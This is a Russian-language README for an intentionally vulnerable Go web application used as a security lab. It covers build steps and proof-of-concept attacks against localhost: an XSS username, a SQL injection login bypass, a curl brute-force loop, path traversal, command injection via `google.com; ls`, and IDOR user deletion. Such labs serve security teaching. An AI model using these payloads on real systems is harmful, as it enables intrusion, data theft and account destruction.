## 📃 Инструкция по сборке и запуску приложения

### Требования

Для успешной сборки этого приложения вам потребуется:

- Go (версия 1.18 и выше)
- gcc (установленный и доступный в системе, необходим для sqlite3)

### Сборка и запуск

Для сборки приложения выполните следующие команды:

```bash
git clone https://github.com/Stepashka20/vuln-app
cd vuln-app
go build main.go -o vuln-app
```

Перед запуском скопируйте и заполните `.env`:
```bash
cp .env.example .env
```

Для запуска приложения выполните следующую команду:

```bash
./vuln-app
```

После этого приложение будет доступно по адресу http://localhost:8080

## 👨🏻‍💻 Proof of Concept

### 1. XSS
1. Зарегестрируйтесь с ником `<script>alert(1)</script>`:
2. После этого в профиле появляется алерт с цифрой 1.

### 2. SQLI
1. Зарегестрируйте юзера с ником 'admin': 
```bash
curl 'http://localhost:8080/register' --data-raw 'username=admin&password=supersecurepassword'
```
2. Допустим мы знаем что админ есть в системе. Тогда мы можем войти через его аккаунт:
```bash
1. Логин: a' UNION SELECT 'admin','$2y$04$QMuPN3FQ4EtmNAx.mPGY5e3C9UIibGaX/U.uvknhOLadNwtEA.iH6' --
2. Пароль: 1234
```
3. Вход от админа успешен

### 3. Brute force
1. Запустите испровизированный брут, который будет перебирать пароль: 
```bash
seq 50 | xargs -P50 -I{} curl -s -o /dev/null -w "%{http_code}\n" 'http://localhost:8080/login' --data-raw 'username=admin&password={}'
```
2. Как видно, сервер не ограничивает нас в количестве запросов, поэтому мы можем перебрать пароль бесконечно

### 4. Path Traversal
1. В профиле пользователя загрузите любой файл в секции загрузки "любимого файла"
2. В профиле появится кнопка для скачивания файла вида: 
```bash
http://localhost:8080/files?name=e5fedb3b-9717-44b6-a68b-a2bb042f4409.png
```
3. После этого мы можем скачать любой файл с сервера, заменив имя файла в ссылке:
```bash
curl http://localhost:8080/files?name=../main.go
```

### 5. OS command injection
1. Перейдите в утилиту Ping:
```bash
http://localhost:8080/ping
```
2. введите в поле для ввода для сайта:
```bash
google.com; ls
```
3. После этого вы увидите список файлов в директории проекта

### 6. IDOR
1. Зарегестрируйте двух юзеров:
```bash
curl 'http://localhost:8080/register' --data-raw 'username=user1&password=supersecurepassword'
curl 'http://localhost:8080/register' --data-raw 'username=user2&password=supersecurepassword'
```
2. Войдите в систему под первым юзером:
```bash
curl 'http://localhost:8080/login' --data-raw 'username=user1&password=supersecurepassword'
```
3. В профиле будет кнопка для удаления своего аккаунта, которая делает запрос на:
```bash
http://localhost:8080/delete?user=user1
```
4. После этого мы можем удалить любого юзера, заменив имя в запросе:
```bash
http://localhost:8080/delete?user=user2
```